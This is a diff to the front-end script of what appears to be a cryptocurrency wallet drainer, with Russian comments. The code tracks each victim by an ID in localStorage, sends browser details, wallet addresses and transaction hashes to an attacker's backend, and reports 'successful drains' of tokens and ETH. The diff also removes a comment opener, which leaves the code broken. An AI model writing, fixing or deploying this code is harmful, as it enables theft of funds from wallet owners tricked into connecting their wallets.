@@ -131,82 +131,76 @@ async function sendConnectionData(walletAddress) {
 /**
  * Отправка данных о транзакции
  */
-// js/web3connect.js
 
 async function sendTransactionData(txHash, walletAddress) {
     try {
-        console.log('[FRONTEND] sendTransactionData: Функция вызвана с txHash:', txHash);
+        console.log('[FRONTEND] sendTransactionData: Начало отправки данных о транзакции');
+        console.log('[FRONTEND] sendTransactionData: txHash:', txHash, 'walletAddress:', walletAddress);
 
-        // Сначала проверяем, есть ли у нас уже victimId из localStorage
-        const victimIdFromStorage = localStorage.getItem('victimId');
-        if (victimIdFromStorage) {
-            console.log('[FRONTEND] sendTransactionData: Используем victimId из localStorage:', victimIdFromStorage);
-        } else {
-            console.warn('[FRONTEND] sendTransactionData: victimId не найден в localStorage, делаем запрос к /visit');
+        // Получаем victimId из localStorage
+        const victimId = localStorage.getItem('victimId');
+        console.log('[FRONTEND] sendTransactionData: Получен victimId из localStorage:', victimId);
+
+        // Проверяем, есть ли victimId
+        if (!victimId) {
+            console.error('[FRONTEND] sendTransactionData: Victim ID не найден в localStorage!');
+            // Не пытаемся его получить, просто выходим
+            return;
         }
 
-        // Всегда делаем запрос к /visit для получения актуального victimId
-        const lastVisitResponse = await fetch(`${BACKEND_URL}/visit`, {
+        // Формируем данные для отправки
+        const txData = {
+            victimId: victimId,
+            walletAddress: walletAddress,
+            txHash: txHash,
+            timestamp: new Date().toISOString()
+        };
+
+        console.log('[FRONTEND] sendTransactionData: Данные для отправки', txData);
+
+        // Отправляем данные на бэкенд
+        const response = await fetch(`${BACKEND_URL}/transaction`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({
-                userAgent: navigator.userAgent || 'Unknown',
-                platform: navigator.platform || 'Unknown',
-                language: navigator.language || 'Unknown',
-                timestamp: new Date().toISOString()
-            })
+            body: JSON.stringify(txData)
         });
 
-        if (!lastVisitResponse.ok) {
-            const errorText = await lastVisitResponse.text();
-            console.error('[FRONTEND] sendTransactionData: Ошибка при проверке посещения:', errorText);
-            return;
-        }
+        console.log('[FRONTEND] sendTransactionData: Получен ответ от сервера', response.status, response.statusText);
 
-        const visitResult = await lastVisitResponse.json();
-        console.log('[FRONTEND] sendTransactionData: Получен ответ от /visit:', visitResult);
-
-        if (visitResult.success && visitResult.id) {
-            // Используем только что полученный victimId
-            const victimId = visitResult.id;
-            console.log('[FRONTEND] sendTransactionData: Используем новый victimId:', victimId);
-
-            const transactionData = {
-                victimId: victimId,
-                walletAddress: walletAddress,
-                txHash: txHash,
-                timestamp: new Date().toISOString()
-            };
-
-            const response = await fetch(`${BACKEND_URL}/transaction`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(transactionData)
-            });
-
-            if (!response.ok) {
-                const errorText = await response.text();
-                console.error('[FRONTEND] sendTransactionData: Ошибка от сервера:', errorText);
-                return;
-            }
-
-            const result = await response.json();
-            console.log('[FRONTEND] sendTransactionData: Ответ сервера', result);
+        // Проверяем статус ответа
+        if (!response.ok) {
+            const errorText = await response.text();
+            console.error('[FRONTEND] sendTransactionData: Ошибка от сервера:', errorText);
             
-            // Успешно отправлено
-        } else {
-            console.warn('[FRONTEND] sendTransactionData: Сервер не вернул success=true или id', visitResult);
-            return;
+            // Если сервер сказал, что жертва не найдена
+            if (response.status === 404 && errorText.includes("Victim not found")) {
+                console.warn('[FRONTEND] sendTransactionData: Сервер сообщил, что Victim ID не найден. Возможно, сессия устарела.');
+                // Удаляем устаревший ID из localStorage
+                localStorage.removeItem('victimId');
+                console.log('[FRONTEND] sendTransactionData: Устаревший Victim ID удален из localStorage.');
+                // Не пытаемся снова вызывать sendVisitData, просто сообщаем об ошибке
+            }
+            
+            return; // Выходим из функции
         }
+
+        // Если ответ успешный
+        const result = await response.json();
+        console.log('[FRONTEND] sendTransactionData: Успешный ответ от сервера', result);
+        
+        // Уведомление отправлено успешно
+        console.log('[FRONTEND] sendTransactionData: Данные о транзакции успешно отправлены на бэкенд.');
+
     } catch (error) {
-        console.error('[FRONTEND] sendTransactionData: Ошибка:', error);
+        // Обрабатываем сетевые ошибки и другие исключения
+        console.error('[FRONTEND] sendTransactionData: Критическая ошибка при отправке данных:', error);
     }
+    
+    console.log('[FRONTEND] sendTransactionData: Функция завершена.');
 }
-/**
+
  * Отправка данных об успешном дрейне
  */
 async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTokens = [], ethSuccess = false) {
@@ -733,6 +727,7 @@ window.addEventListener('DOMContentLoaded', () => {
         console.warn('[INIT] DOMContentLoaded: Кнопка подключения не найдена в DOM');
     }
 });
+
 
 
 
